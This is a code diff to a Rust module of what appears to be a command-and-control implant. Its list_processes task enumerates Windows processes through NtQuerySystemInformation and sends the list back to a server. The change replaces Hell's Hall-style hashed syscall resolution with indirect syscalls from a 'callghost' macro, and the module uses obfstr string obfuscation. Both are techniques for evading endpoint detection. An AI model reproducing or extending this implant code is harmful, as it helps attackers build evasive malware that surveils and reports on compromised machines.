@@ -1,35 +1,13 @@
-use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall, crc32h};
-use std::{
-    ptr,
-    mem::{size_of, zeroed},
-    slice,
-};
+use callghost::syscall;
+use std::slice;
 use winapi::shared::{
-    ntdef::{NTSTATUS, PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER},
-    minwindef::DWORD,
+    ntdef::{PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER},
 };
 use serde_json::Value;
 use obfstr::obfstr;
 
 const SystemProcessInformation: u32 = 5;
 const BUFFER_SIZE: usize = 0x100000;
-
-#[repr(C)]
-struct VM_COUNTERS {
-    PeakVirtualSize: usize,
-    VirtualSize: usize,
-    PageFaultCount: ULONG,
-    PeakWorkingSetSize: usize,
-    WorkingSetSize: usize,
-    QuotaPeakPagedPoolUsage: usize,
-    QuotaPagedPoolUsage: usize,
-    QuotaPeakNonPagedPoolUsage: usize,
-    QuotaNonPagedPoolUsage: usize,
-    PagefileUsage: usize,
-    PeakPagefileUsage: usize,
-    PrivatePageCount: usize,
-    Reserved: [usize; 6],
-}
 
 #[repr(C)]
 struct SYSTEM_THREAD_INFORMATION {
@@ -80,72 +58,56 @@ struct SYSTEM_PROCESS_INFORMATION {
     ReadTransferCount: i64,
     WriteTransferCount: i64,
     OtherTransferCount: i64,
-    Threads: [SYSTEM_THREAD_INFORMATION; 1], // dynamic array
+    Threads: [SYSTEM_THREAD_INFORMATION; 1],
 }
 
 type LONG = i32;
 type KPRIORITY = LONG;
 
-
-pub fn list_processes(task: &Value) -> Result<(), Box<dyn std::error::Error>>  {
+pub fn list_processes(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     let mut output = String::new();
 
     unsafe {
-        let hash = crc32h("NtQuerySystemInformation");
+        let mut buffer = vec![0u8; BUFFER_SIZE];
+        let mut return_len: ULONG = 0;
 
-        let mut syscall = NtSyscall {
-            dw_ssn: 0,
-            dw_syscall_hash: 0,
-            p_syscall_address: ptr::null_mut(),
-            p_syscall_inst_address: ptr::null_mut(),
-        };
+        let status = syscall!(
+            indirect,
+            NtQuerySystemInformation,
+            SystemProcessInformation,
+            buffer.as_mut_ptr(),
+            BUFFER_SIZE as u32,
+            &mut return_len
+        );
 
-        if !fetch_nt_syscall(hash, &mut syscall) {
-            output.push_str("[!] Could not resolve NtQuerySystemInformation\n");
+        if status != 0 {
+            output.push_str(&format!(
+                "[!] NtQuerySystemInformation failed: 0x{:X}\n",
+                status as u32
+            ));
         } else {
-            SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);
+            let mut offset = 0;
+            while offset < return_len as usize {
+                let proc_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
 
-            let mut buffer = vec![0u8; BUFFER_SIZE];
-            let mut return_len: ULONG = 0;
+                let pid = (*proc_info).UniqueProcessId as usize;
+                let name = if (*proc_info).ImageName.Length > 0 {
+                    let name_slice = slice::from_raw_parts(
+                        (*proc_info).ImageName.Buffer,
+                        (*proc_info).ImageName.Length as usize / 2,
+                    );
+                    String::from_utf16_lossy(name_slice)
+                } else {
+                    String::from("System Idle Process")
+                };
 
-            let status: NTSTATUS = RunSyscall(
-                SystemProcessInformation as _,
-                buffer.as_mut_ptr() as _,
-                BUFFER_SIZE as _,
-                &mut return_len as *mut _ as _,
-                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
-                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
-                ptr::null_mut()
-            );
+                output.push_str(&format!("[{}] {}\n", pid, name));
 
-            if status != 0 {
-                output.push_str(&format!(
-                    "[!] NtQuerySystemInformation failed: 0x{:X}\n", status
-                ));
-            } else {
-                let mut offset = 0;
-                while offset < return_len as usize {
-                    let proc_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
-
-                    let pid = (*proc_info).UniqueProcessId as usize;
-                    let name = if (*proc_info).ImageName.Length > 0 {
-                        let slice = slice::from_raw_parts(
-                            (*proc_info).ImageName.Buffer,
-                            (*proc_info).ImageName.Length as usize / 2
-                        );
-                        String::from_utf16_lossy(slice)
-                    } else {
-                        String::from("System Idle Process")
-                    };
-
-                    output.push_str(&format!("[{}] {}\n", pid, name));
-
-                    if (*proc_info).NextEntryOffset == 0 {
-                        break;
-                    }
-
-                    offset += (*proc_info).NextEntryOffset as usize;
+                if (*proc_info).NextEntryOffset == 0 {
+                    break;
                 }
+
+                offset += (*proc_info).NextEntryOffset as usize;
             }
         }
     }
@@ -165,7 +127,6 @@ pub fn list_processes(task: &Value) -> Result<(), Box<dyn std::error::Error>>  {
     });
 
     let response_value = serde_json::to_string(&response_json)?;
-    // Send the response back to the server
     crate::transport::send_request(&response_value)?;
     Ok(())
 }
